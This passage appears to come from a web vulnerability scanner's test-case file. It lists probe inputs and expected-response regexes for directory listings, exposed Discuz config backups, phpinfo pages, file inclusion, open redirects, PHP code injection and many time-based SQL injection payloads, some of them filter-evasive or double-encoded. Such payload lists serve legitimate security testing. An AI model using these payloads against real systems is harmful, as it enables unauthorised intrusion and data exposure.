        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "~root",
        "encode":  "NO",
    },

    {
        "case_id": 1060010092,
        "target": "(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<title>Index\\sof\\s.*?<\\/title>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(Directory Listing for)|(<title>Directory Listing For)|(<title>Index\\sof\\s.*?<\\/title>)|(<a href=\"\\?C=[NMSD];O=[AD]\">Name<\\/a>)|(<body><h1>Directory\\sListing\\sFor\\s.*<\\/h1>)|(<HTML><HEAD><TITLE>Directory:.*?<\\/TITLE><\\/HEAD><BODY>)|(<A\\sHREF=\"[^\"]*\">\\[To\\sParent\\sDirectory]<\\/A>)|(<table summary=\"Directory Listing\")|(<TITLE>Folder Listing)|(Last modified<\\/a>)|(<title>Directory Listing For)|(Directory Listing for)",
        "input": "~www",
        "encode":  "NO",
    },

]

discuz_enhance_detect_test_cases = [

    {
        "case_id": 1190020005,
        "target": "(Access Denied)|(Authracation has expiried)|(Discuz!\\s+Style)",
        "input": "/uc_server/control/app.php",
        "encode":  "NO",
    },

    {
        "case_id": 1190020003,
        "target": "(Access Denied)|(Authracation has expiried)|(Discuz!\\s+Style)",
        "input": "/templates/default/about.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1190020002,
        "target": "(Access Denied)|(Authracation has expiried)|(Discuz!\\s+Style)",
        "input": "/template/default/discuz_style_default.xml",
        "encode":  "NO",
    },

    {
        "case_id": 1190020001,
        "target": "(Access Denied)|(Authracation has expiried)|(Discuz!\\s+Style)",
        "input": "/api/uc.php",
        "encode":  "NO",
    },

    {
        "case_id": 1190020004,
        "target": "(Access Denied)|(Authracation has expiried)|(Discuz!\\s+Style)",
        "input": "/templates/uchome/discuz_style_uchome.xml",
        "encode":  "NO",
    },

]


discuz_risk_file_detect_test_cases = [

    {
        "case_id": 1160010012,
        "target": "<\\?php",
        "input": "config/config_global.php",
        "encode":  "NO",
    },

    {
        "case_id": 1160010011,
        "target": "<\\?php",
        "input": "config.inc.php.bak",
        "encode":  "NO",
    },

    {
        "case_id": 1160010010,
        "target": "<\\?php",
        "input": "config.inc.php",
        "encode":  "NO",
    },

    {
        "case_id": 1160010009,
        "target": "<\\?php",
        "input": "bbs/uc_server/data/config.inc.php.bak",
        "encode":  "NO",
    },

    {
        "case_id": 1160010008,
        "target": "<\\?php",
        "input": "bbs/uc_server/config.inc.php.bak",
        "encode":  "NO",
    },

    {
        "case_id": 1160010007,
        "target": "<\\?php",
        "input": "bbs/uc_server/config.inc.php",
        "encode":  "NO",
    },

    {
        "case_id": 1160010006,
        "target": "<\\?php",
        "input": "bbs/config/config_ucenter.php.bak",
        "encode":  "NO",
    },

    {
        "case_id": 1160010005,
        "target": "<\\?php",
        "input": "bbs/config/config_ucenter.php",
        "encode":  "NO",
    },

    {
        "case_id": 1160010004,
        "target": "<\\?php",
        "input": "bbs/config/config_global.php.bak",
        "encode":  "NO",
    },

    {
        "case_id": 1160010003,
        "target": "<\\?php",
        "input": "bbs/config/config_global.php",
        "encode":  "NO",
    },

    {
        "case_id": 1160010002,
        "target": "<\\?php",
        "input": "bbs/config.inc.php.bak",
        "encode":  "NO",
    },

    {
        "case_id": 1160010001,
        "target": "<\\?php",
        "input": "bbs/config.inc.php",
        "encode":  "NO",
    },

    {
        "case_id": 1160010013,
        "target": "<\\?php",
        "input": "config/config_global.php.bak",
        "encode":  "NO",
    },

    {
        "case_id": 1160010014,
        "target": "<\\?php",
        "input": "config/config_ucenter.php",
        "encode":  "NO",
    },

    {
        "case_id": 1160010015,
        "target": "<\\?php",
        "input": "config/config_ucenter.php.bak",
        "encode":  "NO",
    },

    {
        "case_id": 1160010016,
        "target": "<\\?php",
        "input": "uc_server/config.inc.php",
        "encode":  "NO",
    },

    {
        "case_id": 1160010017,
        "target": "<\\?php",
        "input": "uc_server/config.inc.php.bak",
        "encode":  "NO",
    },

    {
        "case_id": 1160010018,
        "target": "<\\?php",
        "input": "uc_server/data/config.inc.php.bak",
        "encode":  "NO",
    },

]


django_debug_mod_on_detect_test_cases = [

    {
        "case_id": 1120230001,
        "target": "Django tried these URL patterns",
        "input": "scantestxxx",
        "encode":  "NO",
    },

]

file_include_detect_test_cases = [

    {
        "case_id": 1090010001,
        "target": "(<b>(Warning|Fatal\\serror)<\\/b>:(?:(?:\\s*?main\\(\\))|(?:\\s*?(include|include_once|require|require_once)\\(\\) \\[<a href='function\\.(include|require)'>function\\.(include|require)<\\/a>\\])): Failed opening (required\\s)?'\\./index.php')|(<b>Fatal error<\\/b>:.*: Failed opening required '\\./index.php')|(<b>Warning<\\/b>:  (file_get_contents\\(\\./index.php\\)( \\[<a href='function\\.file-get-contents'>function\\.file-get-contents<\\/a>\\])?|fopen\\(\\./index.php\\)( \\[<a href='function\\.fopen'>function\\.fopen<\\/a>\\])?): failed to open stream: (No such file or directory|Invalid argument|(HTTP request failed! .*)) in <b>.*?<\\/b> on line <b>.*?<\\/b>)|(<b>Warning<\\/b>:.*: Failed opening '\\./index.php' for inclusion)|(Failed opening '\\./index.php' for inclusion)|(The requested resource\\s\\(.*fileinclude\\.txt\\) is not available)|(java\\.io\\.FileNotFoundException:\\/127\\.0\\.0\\.1\\/fileinclude\\.txt[\\s\\n])|(java\\.io\\.FileNotFoundException:\\s.*?:\\/127\\.0\\.0\\.1\\/fileinclude\\.txt\\s)|(org.apache.jasper.JasperException: .*? File .*? not found)|(Failed opening required\\s'.*?fileinclude\\.txt.*?'\\s)|(Warning: fopen\\(.*?fileinclude\\.txt.*?\\)\\s)|(\\[FileNotFoundException:\\sCould\\snot\\sfind\\sfile\\s'\\./index.php'.\\])|(java.io.FileNotFoundException:\\s\\./index.php)|(java\\.lang\\.IllegalArgumentException: URI can't be null\\.)|(java\\.lang\\.IllegalArgumentException:\\sURI has an authority component)|(java\\.net\\.MalformedURLException:\\sno protocol:\\s\\./index.php)|(Warning:\\s*fopen\\(\\):\\s*Unable to access\\s*\\./index\\.php)",
        "input": "./index.php",
        "encode":  "NO",
    },

    {
        "case_id": 1090010002,
        "target": "(<b>(Warning|Fatal\\serror)<\\/b>:(?:(?:\\s*?main\\(\\))|(?:\\s*?(include|include_once|require|require_once)\\(\\) \\[<a href='function\\.(include|require)'>function\\.(include|require)<\\/a>\\])): Failed opening (required\\s)?'\\./index%00\\.jpg')|(<b>Fatal error<\\/b>:.*: Failed opening required '\\./index%00\\.jpg')|(<b>Warning<\\/b>:  (file_get_contents\\(\\./index%00\\.jpg\\)( \\[<a href='function\\.file-get-contents'>function\\.file-get-contents<\\/a>\\])?|fopen\\(\\./index%00\\.jpg\\)( \\[<a href='function\\.fopen'>function\\.fopen<\\/a>\\])?): failed to open stream: (No such file or directory|Invalid argument|(HTTP request failed! .*)) in <b>.*?<\\/b> on line <b>.*?<\\/b>)|(<b>Warning<\\/b>:.*: Failed opening '\\./index%00\\.jpg' for inclusion)|(Failed opening '\\./index%00\\.jpg' for inclusion)|(The requested resource\\s\\(.*fileinclude\\.txt\\) is not available)|(java\\.io\\.FileNotFoundException:\\/127\\.0\\.0\\.1\\/fileinclude\\.txt[\\s\\n])|(java\\.io\\.FileNotFoundException:\\s.*?:\\/127\\.0\\.0\\.1\\/fileinclude\\.txt\\s)|(org.apache.jasper.JasperException: .*? File .*? not found)|(Failed opening required\\s'.*?fileinclude\\.txt.*?'\\s)|(Warning: fopen\\(.*?fileinclude\\.txt.*?\\)\\s)|(\\[FileNotFoundException:\\sCould\\snot\\sfind\\sfile\\s'\\./index%00\\.jpg'.\\])|(java.io.FileNotFoundException:\\s\\./index%00\\.jpg)|(java\\.lang\\.IllegalArgumentException: URI can't be null\\.)|(java\\.lang\\.IllegalArgumentException:\\sURI has an authority component)|(java\\.net\\.MalformedURLException:\\sno protocol:\\s\\./index%00\\.jpg)|(Warning:\\s*fopen\\(\\):\\s*Unable to access\\s*\\./index\\.php%00\\.jpg)",
        "input": "./index.php%00.jpg",
        "encode":  "NO",
    },

]

iis_short_file_detect_test_cases = [

    {
        "case_id": 1130010001,
        "input": "/*~0*/a.aspx?aspxerrorpath=/",
        "encode":  "NO",
    },

    {
        "case_id": 1130010002,
        "input": "/*~1*/a.aspx?aspxerrorpath=/",
        "encode":  "NO",
    },

]


jump_leak_detect_test_cases = [

    {
        "case_id": 1070030002,
        "input": "//www.qq.com.521.qq.diao.yu.wangzhan.1ab2c3.com",
        "target": "^(http:)?(\\/\\/)?www\\.qq\\.com\\.521\\.qq\\.diao\\.yu\\.wangzhan\\.1ab2c3\\.com",
        "encode":  "ALL",
    },

    {
        "case_id": 1070030001,
        "input": "//www.qq.com_521_qq_diao_yu_wangzhan_789.com",
        "target": "^(http:)?(\\/\\/)?www\\.qq\\.com_521_qq_diao_yu_wangzhan_789\\.com",
        "encode":  "ALL",
    },

    {
        "case_id": 1070030004,
        "input": "http://www.qq.com_521_qq_diao_yu_wangzhan_789.com",
        "target": "^(http:)?(\\/\\/)?www\\.qq\\.com_521_qq_diao_yu_wangzhan_789\\.com",
        "encode":  "ALL",
    },

    {
        "case_id": 1070030003,
        "input": "http://www.qq.com.521.qq.diao.yu.wangzhan.1ab2c3.com",
        "target": "^(http:)?(\\/\\/)?www\\.qq\\.com\\.521\\.qq\\.diao\\.yu\\.wangzhan\\.1ab2c3\\.com",
        "encode":  "ALL",
    },

]

ngx_file_parse_detect_test_cases = [

    {
        "case_id": 1120010001,
        "input": "%00.php",
        "encode":  "NO",
    },

    {
        "case_id": 1120010002,
        "input": "asdf.php",
        "encode":  "NO",
    },

]


php_cgi_rce_detect_test_cases = [

    {
        "case_id": 1120220006,
        "target": "c0de82253a0a5c9c4b3ba209f15c02b3",
        "input": "%27.print(md5(TST_test)).%27",
        "encode":  "NO",
    },

    {
        "case_id": 1120220007,
        "target": "c0de82253a0a5c9c4b3ba209f15c02b3",
        "input": "'.print(md5(TST_test)).'",
        "encode":  "ALL",
    },

    {
        "case_id": 1120220005,
        "target": "c0de82253a0a5c9c4b3ba209f15c02b3",
        "input": "<?php echo(md5(TST_test)); ?>",
        "encode":  "YES",
    },

    {
        "case_id": 1120220004,
        "target": "c0de82253a0a5c9c4b3ba209f15c02b3",
        "input": "${@print(md5(TST_test))}\\",
        "encode":  "ALL",
    },

    {
        "case_id": 1120220002,
        "target": "c0de82253a0a5c9c4b3ba209f15c02b3",
        "input": "print(md5(TST_test));",
        "encode":  "ALL",
    },

    {
        "case_id": 1120220003,
        "target": "c0de82253a0a5c9c4b3ba209f15c02b3",
        "input": ";print(md5(TST_test));",
        "encode":  "ALL",
    },

    {
        "case_id": 1120220001,
        "target": "c0de82253a0a5c9c4b3ba209f15c02b3",
        "input": "\";print(md5(TST_test));$a=\"",
        "encode":  "ALL",
    },

    {
        "case_id": 1120220008,
        "input": "';print(md5(TST_test));//",
        "target": "c0de82253a0a5c9c4b3ba209f15c02b3",
        "encode":  "NO",
    },

]

php_fake_info_detect_test_cases = [

    {
        "case_id": 1030050010,
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "input": "info.php",
        "encode":  "NO",
    },

    {
        "case_id": 1030050004,
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "input": "pi.php5",
        "encode":  "NO",
    },

    {
        "case_id": 1030050008,
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "input": "temp.php",
        "encode":  "NO",
    },

    {
        "case_id": 1030050009,
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "input": "tmp.php",
        "encode":  "NO",
    },

    {
        "case_id": 1030050007,
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "input": "test.php",
        "encode":  "NO",
    },

    {
        "case_id": 1030050006,
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "input": "i.php",
        "encode":  "NO",
    },

    {
        "case_id": 1030050005,
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "input": "php.php",
        "encode":  "NO",
    },

    {
        "case_id": 1030050001,
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "input": "phpinfo.php",
        "encode":  "NO",
    },

    {
        "case_id": 1030050003,
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "input": "pi.php",
        "encode":  "NO",
    },

    {
        "case_id": 1030050002,
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "input": "phpinfo.php5",
        "encode":  "NO",
    },

    {
        "case_id": 1030050011,
        "input": "test.php",
        "target": "(<title>phpinfo\\(\\)<\\/title>)|(<title>phpinfo\\(\\)<\\/title>.*<tr><td class=\"e\">Configuration File \\(php.ini\\) Path <\\/td>)",
        "encode":  "NO",
    },

]

sql_inject_detect_timing_test_cases = [

    {
        "case_id": 1100020321,
        "input": "-if(now()=sysdate(),sleep(duration),0)/*'XOR(if(now()=sysdate(),sleep(duration),0))OR'\"XOR(if(now()=sysdate(),sleep(duration),0))OR\"*/",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020319,
        "input": "`-if(now()=sysdate(),sleep(duration),0)--",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020317,
        "input": "xyz' Or if(now()=sysdate(),sleep(duration),0)%3d0 limit 1%23",
        "encode":  "YES",
    },

    {
        "case_id": 1100020318,
        "input": "xyz'/**/Or/**/if(now()=sysdate(),sleep(duration),0)%3d0/**/limit/**/1%23",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020316,
        "input": "xyz'     Or      if(now()=sysdate(),sleep(duration),0)%3d0        limit   1%23",
        "encode":  "YES",
    },

    {
        "case_id": 1100020300,
        "input": "WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020315,
        "input": "xyz\"/**/Or/**/if(now()=sysdate(),sleep(duration),0)%3d0/**/limit/**/1%23",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020314,
        "input": "xyz\" Or if(now()=sysdate(),sleep(duration),0)%3d0 limit 1%23",
        "encode":  "YES",
    },

    {
        "case_id": 1100020313,
        "input": "xyz\"     Or      if(now()=sysdate(),sleep(duration),0)%3d0        limit   1%23",
        "encode":  "YES",
    },

    {
        "case_id": 1100020312,
        "input": "val;waitfor delay '0:0:duration' --",
        "encode":  "YES",
    },

    {
        "case_id": 1100020311,
        "input": "val;select pg_sleep(duration); --",
        "encode":  "YES",
    },

    {
        "case_id": 1100020310,
        "input": "val' sleep(duration)='",
        "encode":  "YES",
    },

    {
        "case_id": 1100020309,
        "input": "val' and sleep(duration)='",
        "encode":  "YES",
    },

    {
        "case_id": 1100020308,
        "input": "val' and (sleep(duration)+1) limit 1 --",
        "encode":  "YES",
    },

    {
        "case_id": 1100020307,
        "input": "val' and (select 1 from (select sleep(duration)A))%23",
        "encode":  "YES",
    },

    {
        "case_id": 1100020306,
        "input": "val' (select 1 from (select sleep(duration))A",
        "encode":  "YES",
    },

    {
        "case_id": 1100020305,
        "input": "val\" sleep(duration)=\"",
        "encode":  "YES",
    },

    {
        "case_id": 1100020304,
        "input": "val\" or (sleep(duration)+1) limit 1 --",
        "encode":  "YES",
    },

    {
        "case_id": 1100020303,
        "input": "val\" and (sleep(duration)+1) limit 1 --",
        "encode":  "YES",
    },

    {
        "case_id": 1100020301,
        "input": "val and sleep(duration)",
        "encode":  "YES",
    },

    {
        "case_id": 1100020302,
        "input": "val or (sleep(duration)+1) limit 1 --",
        "encode":  "YES",
    },

    {
        "case_id": 1100020299,
        "input": "WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020298,
        "input": "WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020296,
        "input": "WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020297,
        "input": "WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020295,
        "input": "WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020294,
        "input": "RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020329,
        "input": "%2522xyz%2527%2520Or%2520if%2528now%2528%2529%253Dsysdate%2528%2529%252Csleep%2528duration%2529%252C0%2529%253D0%2520limit%25201%2523%2522%2520%2520",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020328,
        "input": "if%2528now%2528%2529%253Dsysdate%2528%2529%252Csleep%2528duration%2529%252C0%2529%252f%252a%2527xor%2528if%2528now%2528%2529%253Dsysdate%2528%2529%252Csleep%2528duration%2529%252C0%2529%2529or%2527%255C%2522xor%2528if%2528now%2528%2529%253Dsysdate%2528%2529%252Csleep%2528duration%2529%252C0%2529%2529or%255C%2522%252a%252f",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020327,
        "input": "0%2520Or%2520if%2528now%2528%2529%253Dsysdate%2528%2529%252Csleep%2528duration%2529%252C0%2529%253D0%2520limit%25201%2523",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020325,
        "input": "%2527%252C%2528SELECT%2520%2528CASE%2520WHEN%2520%2528%255C%2522rndstr%255C%2522%253D%255C%2522rndstr%255C%2522%2529%2520THEN%2520sleep%2528duration%2529%2520ELSE%2520rndstr%252a%2528SELECT%2520rndstr%2520FROM%2520INFORMATION_SCHEMA.CHARACTER_SETS%2529%2520END%2529%2529",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020323,
        "input": "%2527And%2528if%2528now%2528%2529%253Dsysdate%2528%2529%252Csleep%2528duration%2529%252C0%2529%2529and%25271",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020324,
        "input": "-if%2528now%2528%2529%253Dsysdate%2528%2529%252Csleep%2528duration%2529%252C0%2529%252f%252a%2527XOR%2528if%2528now%2528%2529%253Dsysdate%2528%2529%252Csleep%2528duration%2529%252C0%2529%2529OR%2527%255C%2522XOR%2528if%2528now%2528%2529%253Dsysdate%2528%2529%252Csleep%2528duration%2529%252C0%2529%2529OR%255C%2522%252a%252f%2522%2520%2520",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020292,
        "input": "Or/**/if(now()=sysdate(),sleep(duration),0)",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020293,
        "input": "RLIKE (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020291,
        "input": "OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020288,
        "input": "AnD \"rndstr\"=\"rndstr\" OR sleep(duration) And \"rndstr\"=\"rndstr\"",
        "encode":  "YES",
    },

    {
        "case_id": 1100020290,
        "input": "OR (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020289,
        "input": "MAKE_SET(\"rndstr\"=\"rndstr\",sleep(duration))",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020285,
        "input": "AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020286,
        "input": "AnD \"rndstr\"=\"rndstr\" OR pg_sleep(duration)",
        "encode":  "YES",
    },

    {
        "case_id": 1100020287,
        "input": "AnD \"rndstr\"=\"rndstr\" OR sleep(duration)",
        "encode":  "YES",
    },

    {
        "case_id": 1100020284,
        "input": "AND (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020279,
        "input": "1 And if(now()=sysdate(),sleep(duration),0)",
        "encode":  "YES",
    },

    {
        "case_id": 1100020280,
        "input": "1\") And if(now()=sysdate(),sleep(duration),0)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020281,
        "input": "1') And if(now()=sysdate(),sleep(duration),0)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020282,
        "input": "1/*!30000-sleep(duration)*/",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020283,
        "input": "1/**/And/**/if(now()=sysdate(),sleep(duration),0)",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020278,
        "input": "1 AnD \"rndstr\"=\"rndstr\" OR sleep(duration)",
        "encode":  "YES",
    },

    {
        "case_id": 1100020277,
        "input": "1 AnD \"rndstr\"=\"rndstr\" OR pg_sleep(duration)",
        "encode":  "YES",
    },

    {
        "case_id": 1100020276,
        "input": "0/**/Or/**/if(now()=sysdate(),sleep(duration),0)%3d0/**/limit/**/1%23",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020275,
        "input": "0 Or if(now()=sysdate(),sleep(duration),0)%3d0 limit 1%23",
        "encode":  "YES",
    },

    {
        "case_id": 1100020274,
        "input": "/**/And/**/if(now()=sysdate(),sleep(duration),0)",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020273,
        "input": "/**/AnD/**/\"rndstr\"=\"rndstr\"/**/OR/**/sleep(duration)",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020272,
        "input": "/**/AnD/**/\"rndstr\"=\"rndstr\"/**/OR/**/pg_sleep(duration)",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020271,
        "input": "/*!AnD*/\"rndstr\"=\"rndstr\"/*!OR/*!sLeEp*/(duration)/*!And*/\"rndstr\"=\"rndstr\"",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020270,
        "input": "/*!30000-sleep(duration)*/",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020269,
        "input": "-sleep(duration)",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020268,
        "input": "-if(now()=sysdate(),sleep(duration),0)/*'xor(if(now()=sysdate(),sleep(duration),0))or'\"xor(if(now()=sysdate(),sleep(duration),0))or\"*/",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020267,
        "input": "-if(now()=sysdate(),sleep(duration),0)/*'XOR(if(now()=sysdate(),sleep(duration),0))OR'\"XOR(if(now()=sysdate(),sleep(duration),0))OR\"*/&\"rndstr\"=\"rndstr\"/a/",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020266,
        "input": "-if(now()=sysdate(),sleep(duration),0)/*'XOR(if(now()=sysdate(),sleep(duration),0))OR'\"XOR(if(now()=sysdate(),sleep(duration),0))OR\"*/&\"rndstr\"=\"rndstr\"&\"rndstr\"=\"rndstr\"/a/",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020263,
        "input": ",if(now()=sysdate(),sleep(duration),0)",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020264,
        "input": "-/*!sleep(duration)*/",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020265,
        "input": "-if(now()=sysdate(),sleep(duration),0)",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020262,
        "input": ",(SELECT (CASE WHEN (\"rndstr\"=\"rndstr\") THEN sleep(duration) ELSE rndstr*(SELECT rndstr FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020258,
        "input": "+sleep(duration)+\"",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020259,
        "input": "\"+sleep(duration)+\"",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020253,
        "input": ")) AS rndstr WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020254,
        "input": ")) AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020255,
        "input": ")) AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020256,
        "input": ")) OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020257,
        "input": ")) RLIKE (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020261,
        "input": "'+sleep(duration)+'",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020260,
        "input": "+sleep(duration)+'",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020251,
        "input": ")) AS rndstr WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(SLEEP(duration-(IF(\"rndstr\"=\"rndstr\",0,duration))))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020320,
        "input": "if(now()=sysdate(),sleep(duration),0)/*'xor(if(now()=sysdate(),sleep(duration),0))or'\"xor(if(now()=sysdate(),sleep(duration),0))or\"*/",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020252,
        "input": ")) AS rndstr WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020249,
        "input": ")) AS rndstr WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020250,
        "input": ")) AS rndstr WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020248,
        "input": ")) AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020247,
        "input": ") WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020246,
        "input": ") WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020244,
        "input": ") WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020245,
        "input": ") WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020243,
        "input": ") WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020242,
        "input": ") WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020241,
        "input": ") RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020240,
        "input": ") RLIKE (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020239,
        "input": ") OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020237,
        "input": ") AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020238,
        "input": ") OR (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020236,
        "input": ") AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020235,
        "input": ") AS rndstr WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020234,
